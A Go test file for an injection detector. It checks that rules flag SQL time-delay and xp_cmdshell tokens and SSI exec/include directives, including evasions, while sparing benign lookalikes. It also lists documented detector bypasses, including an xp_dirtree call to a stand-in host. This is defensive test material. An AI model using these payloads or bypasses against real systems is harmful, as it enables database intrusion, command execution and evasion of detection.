package detect

import (
	"strings"
	"testing"
)

// sqlTokenPositives are MSSQL, Postgres and Oracle time-delay and command
// execution forms AEG-SQLI-002 flags, with the evasions it handles: case,
// blanks, line breaks and SQL comments between the words, a schema prefix,
// quoted names, one percent-encoding pass.
var sqlTokenPositives = []string{
	// MSSQL WAITFOR DELAY / TIME with a literal or a variable.
	"WAITFOR DELAY '0:0:5'",
	";WAITFOR DELAY '0:0:5'",
	"waitfor delay '00:00:05'",
	"WaItFoR DeLaY '0:0:5'",
	"WAITFOR   DELAY   '0:0:5'",
	"WAITFOR\nDELAY\n'0:0:5'",
	"WAITFOR\r\n\tDELAY '0:0:5'",
	"WAITFOR/**/DELAY/**/'0:0:5'",
	"WAITFOR/*x*/DELAY'0:0:5'",
	"WAITFOR--x\nDELAY '0:0:5'",
	"WAITFOR DELAY N'0:0:5'",
	"WAITFOR DELAY \"0:0:5\"",
	"WAITFOR DELAY @d",
	"WAITFOR TIME '23:59'",
	"1);WAITFOR DELAY '0:0:20'--",
	"),NULL)%20waitfor%20delay%20'0:0:20'%20--",
	"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",
	"x" + strings.Repeat(" ", 120) + "WAITFOR DELAY '0:0:5'",
	// xp_cmdshell, the bare token.
	"exec master..xp_cmdshell 'ipconfig /all'",
	"xp_cmdshell",
	"XP_CMDSHELL",
	"; exec master..xp_cmdshell 'dir'",
	"EXEC master.dbo.xp_cmdshell 'whoami'",
	"exec [xp_cmdshell] 'dir'",
	"EXEC sp_configure 'xp_cmdshell', 1",
	"exec%20xp_cmdshell",
	// Postgres pg_sleep, pg_sleep_for, pg_sleep_until called.
	"pg_sleep(5)",
	"PG_SLEEP(5)",
	"pg_sleep (5)",
	"pg_sleep/**/(5)",
	"pg_sleep\n(5)",
	"pg_catalog.pg_sleep(5)",
	"\"pg_sleep\"(5)",
	"pg_sleep_for('5 seconds')",
	"pg_sleep_until(now() + interval '5 s')",
	"1;select pg_sleep(5)",
	"SELECT 1 FROM pg_sleep(5)",
	"pg_sleep%285%29",
	// Oracle DBMS_LOCK.SLEEP and DBMS_SESSION.SLEEP called.
	"DBMS_LOCK.SLEEP(5)",
	"dbms_lock.sleep(5)",
	"DBMS_LOCK . SLEEP (5)",
	"DBMS_LOCK\n.\nSLEEP\n(5)",
	"DBMS_LOCK/**/./**/SLEEP/**/(5)",
	"SYS.DBMS_LOCK.SLEEP(5)",
	"\"DBMS_LOCK\".\"SLEEP\"(5)",
	"DBMS_SESSION.SLEEP(5)",
	",(BEGIN IF (4821=4821) THEN DBMS_LOCK.SLEEP(5); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)",
}

// sqlTokenNegatives are prose and code that name these words without
// calling them. AEG-SQLI-002 must not hit any of them, and the prose ones
// must be clear of every rule (sqlTokenProse).
var sqlTokenNegatives = []string{
	"await waitFor(() => expect(row).toBeVisible())",
	"`hookOnlyWaiter.WaitForDelete` is a no-op",
	"volumeBindingMode: WaitForFirstConsumer",
	"puppet agent --waitforcert 60",
	"waitfor delay",
	"the WAITFOR DELAY statement pauses a batch",
	"WAITFOR DELAY 5",
	"waitfordelay '0:0:5'",
	"wait for delay '5 min'",
	"xp_cmdshell_proxy_account",
	"##xp_cmdshell_proxy_account##",
	"sp_xp_cmdshell_proxy_account",
	"myxp_cmdshell",
	"xp_cmdshell2",
	"xp cmdshell",
	"Fixed pg_sleep handling in the test suite",
	"pg_sleep is a PostgreSQL function",
	"pg_sleep_seconds(5)",
	"pg_sleeping(5)",
	"mypg_sleep(5)",
	"Use DBMS_LOCK.SLEEP for delays",
	"dbms_lock.sleeper(5)",
	"dbms_lock.request(5)",
	"dbms_lock_sleep(5)",
	"DBMS_LOCK",
}

var sqlTokenProse = []string{
	"waiting for delay in shipping",
	"delay: 5 days",
	"sleep 5 minutes",
	"waitfor delay",
	"the WAITFOR DELAY statement pauses a batch",
	"Fixed pg_sleep handling in the test suite",
	"Use DBMS_LOCK.SLEEP for delays",
	"xp cmdshell",
}

// sqlTokenAcceptedMisses are attack-shaped values AEG-SQLI-002 deliberately
// does not flag, one group per item of the accepted-miss list in the
// SQLiToken comment, docs/threat-model.md and testdata/corpus/README.md.
// libinjection (AEG-SQLI-001) still flags some of them. If one starts to
// hit AEG-SQLI-002, update all three.
var sqlTokenAcceptedMisses = []string{
	// 1. More than 128 bytes of blanks and comments in one gap.
	"WAITFOR" + strings.Repeat(" ", 130) + "DELAY '0:0:5'",
	"pg_sleep/*" + strings.Repeat("x", 130) + "*/(5)",
	"DBMS_LOCK" + strings.Repeat("\n", 130) + ".SLEEP(5)",
	// 2. A name built at run time or hidden in a literal.
	"EXEC('xp_'+'cmdshell dir')",
	"EXEC('xp_'+'cmdshell ''dir''')",
	"DECLARE @q varchar(99) SET @q=0x77616974666F722064656C61792027303A303A3527 EXEC(@q)",
	"U&\"pg\\005fsleep\"(5)",
	// 3. A call with no '(' after the name, and WAITFOR DELAY or TIME
	// followed by anything but a quote, N' or an @variable; none of these
	// runs.
	"select pg_sleep",
	"SELECT DBMS_LOCK.SLEEP FROM dual",
	"WAITFOR DELAY 5",
	// 4. '+' as a blank outside a query or form value (the engine decodes
	// it only there; ScanText never does).
	"waitfor+delay+'0:0:5'",
	// 5. Other procedures and delay functions.
	"; exec xp_regread",
	"exec master..xp_dirtree '//evil.example/x'",
	"DBMS_PIPE.RECEIVE_MESSAGE('a',5)",
}

// ssiPositives are server-side include directives AEG-SSTI-002 flags, with
// the evasions it handles: case, blanks after "<!--" (IIS) and after '#'
// (nginx), blanks or a line break before the attribute and around '=', a
// wrapping tag, one percent-encoding pass.
var ssiPositives = []string{
	"<!--#exec cmd=\"ls\" -->",
	"<!--#include virtual=\"/etc/passwd\" -->",
	"<!--#echo var=\"DOCUMENT_URI\" -->",
	"<!--#printenv -->",
	"<!--#printenv-->",
	"<!--#printenv",
	"<!--#EXEC CMD=\"ls\" -->",
	"<!--#exec  cmd=\"ls\"-->",
	"<!--#exec cmd =\"ls\"-->",
	"<!--#exec cmd= \"ls\"-->",
	"<!--#exec\ncmd=\"ls\"-->",
	"<!--# exec cmd=\"ls\" -->",
	"<!-- #include file=\"x.inc\" -->",
	"<!--#exec cgi=\"/cgi-bin/x.cgi\"-->",
	"<!--#exec cmd=\"cd C:\\WINDOWS\\System32\">",
	"<!--#exec cmd=\"/usr/bin/id;-->",
	"<!--#config timefmt=\"%A %B %d %Y\"-->",
	"<!--#config errmsg=\"File not found\"-->",
	"<!--#set var=\"x\" value=\"y\" -->",
	"<!--#fsize file=\"ssi.shtml\" -->",
	"<!--#flastmod virtual=\"echo.html\" -->",
	"<!--#include file=?UUUU?-->",
	"<pre><!--#exec cmd=\"ls\" --></pre>",
	"Nice post <!--#echo var=\"DATE_LOCAL\" -->",
	"%3C!--%23exec%20cmd=%22ls%22%20--%3E",
	"<!--<!--#exec cmd=\"id\"-->",
}

// ssiNegatives are HTML comments, editor region markers and template
// anchors that look like SSI but name no directive or give it no
// attribute. None may hit any rule.
var ssiNegatives = []string{
	"<!-- comment -->",
	"<!--# not ssi -->",
	"<!--#region-->",
	"<!--#endregion-->",
	"<!-- #region Helpers -->",
	"<!--#if-->",
	"<!--#else-->",
	"<!--#endif-->",
	"<!--#include-->",
	"<!--#include -->",
	"<!--#exec-->",
	"<!--#echo-->",
	"<!--#set-->",
	"<!--#execute cmd=\"x\"-->",
	"<!--#settings name=x-->",
	"<!--#set up the page -->",
	"<!--#include in the header-->",
	"<!--#echo is fun-->",
	"<!--#printenvironment-->",
	"<!--#123-->",
	"<!--#-->",
	"#include <stdio.h> in C",
	"see #exec cmd=x",
	"<a href=\"#exec\">exec</a>",
}

// ssiAcceptedMisses are SSI shapes AEG-SSTI-002 deliberately does not flag;
// see sqlTokenAcceptedMisses for the list they belong to.
var ssiAcceptedMisses = []string{
	// 1. More than 128 bytes of blanks in one gap.
	"<!--#exec" + strings.Repeat(" ", 130) + "cmd=\"ls\"-->",
	// 6. A directive not on the list, or a first attribute the directive
	// does not take.
	"<!--#if expr=\"$QUERY_STRING = /x/\" -->",
	"<!--#elif expr=\"1\" -->",
	"<!--# block name=\"one\" -->",
	"<!--#exec foo=\"x\" cmd=\"ls\" -->",
	// 7. An opener written as HTML entities.
	"&lt;!--#exec cmd=\"ls\" --&gt;",
}

func TestSQLiTimeExecTokens(t *testing.T) {
	for _, v := range sqlTokenPositives {
		if !hasRule(ScanText(v), "AEG-SQLI-002") {
			t.Errorf("ScanText(%q) has no AEG-SQLI-002: %+v", v, ScanText(v))
		}
		if !hasRule(ScanQueryText(v), "AEG-SQLI-002") {
			t.Errorf("ScanQueryText(%q) has no AEG-SQLI-002", v)
		}
	}
	for _, v := range sqlTokenNegatives {
		if hasRule(ScanText(v), "AEG-SQLI-002") {
			t.Errorf("ScanText(%q) has AEG-SQLI-002, want none", v)
		}
	}
	for _, v := range sqlTokenProse {
		if hits := ScanText(v); hits != nil {
			t.Errorf("ScanText(%q) = %+v, want no hits", v, hits)
		}
	}
	for _, v := range sqlTokenAcceptedMisses {
		if hasRule(ScanText(v), "AEG-SQLI-002") {
			t.Errorf("ScanText(%q) has AEG-SQLI-002: an accepted miss now hits; update the threat model", v)
		}
	}
}

func TestSSIDirectives(t *testing.T) {
	for _, v := range ssiPositives {
		if !hasRule(ScanText(v), "AEG-SSTI-002") {
			t.Errorf("ScanText(%q) has no AEG-SSTI-002: %+v", v, ScanText(v))
		}
	}
	for _, v := range ssiNegatives {
		if hits := ScanText(v); hits != nil {
			t.Errorf("ScanText(%q) = %+v, want no hits", v, hits)
		}
	}
	for _, v := range ssiAcceptedMisses {
		if hasRule(ScanText(v), "AEG-SSTI-002") {
			t.Errorf("ScanText(%q) has AEG-SSTI-002: an accepted miss now hits; update the threat model", v)
		}
	}
}

// TestTokenRulesSurviveClears: the SQLi post-filters (percent text, bare
// number phrases) and the XSS inert-markup guard clear AEG-SQLI-001 and
// AEG-XSS-001 on some values. The token rules are separate detectors, so a
// token in such a value still hits.
func TestTokenRulesSurviveClears(t *testing.T) {
	for _, tc := range []struct{ v, cleared, want string }{
		// The comment backtick isInertMarkup clears.
		{"<!--#exec cmd=\"ls `id`\" -->", "AEG-XSS-001", "AEG-SSTI-002"},
		{"<!-- see the `main` branch --><!--#exec cmd=\"id\" -->", "AEG-XSS-001", "AEG-SSTI-002"},
		{"<!--#include virtual=\"`x`\" -->", "AEG-XSS-001", "AEG-SSTI-002"},
		// Percent product text and a bare number range (isProsePercent,
		// isBareNumberPhrase).
		{"Sale 20% (today only) xp_cmdshell", "AEG-SQLI-001", "AEG-SQLI-002"},
		{"Cotton 95% (organic) pg_sleep(5)", "", "AEG-SQLI-002"},
		{"6-7 or 8 WAITFOR DELAY @d", "", "AEG-SQLI-002"},
	} {
		hits := ScanText(tc.v)
		if !hasRule(hits, tc.want) {
			t.Errorf("ScanText(%q) = %+v, want %s", tc.v, hits, tc.want)
		}
		if tc.cleared != "" && hasRule(hits, tc.cleared) {
			t.Errorf("ScanText(%q) has %s; the clearing path this case tests no longer clears it", tc.v, tc.cleared)
		}
	}
	// The prefilter skips a value with no special byte; the token rule
	// still runs there.
	for _, v := range []string{"xp_cmdshell", "exec master..xp_cmdshell", "WAITFOR DELAY @d"} {
		if mayContainAttack(v) {
			t.Fatalf("mayContainAttack(%q) = true; pick a value the prefilter skips", v)
		}
		if !hasRule(ScanText(v), "AEG-SQLI-002") {
			t.Errorf("ScanText(%q) = %+v, want AEG-SQLI-002", v, ScanText(v))
		}
	}
}

// TestKeySQLiToken: a key that is not a plain identifier (a sort or column
// key built into SQL) gets the token rule too.
func TestKeySQLiToken(t *testing.T) {
	if h, ok := KeySQLi("x; pg_sleep(5)"); !ok || h.RuleID != "AEG-SQLI-002" {
		t.Errorf("KeySQLi(pg_sleep) = %+v, %v, want AEG-SQLI-002", h, ok)
	}
	if h, ok := KeySQLi("xp_cmdshell"); ok {
		t.Errorf("KeySQLi(xp_cmdshell) = %+v: a plain identifier key skips the detectors", h)
	}
}
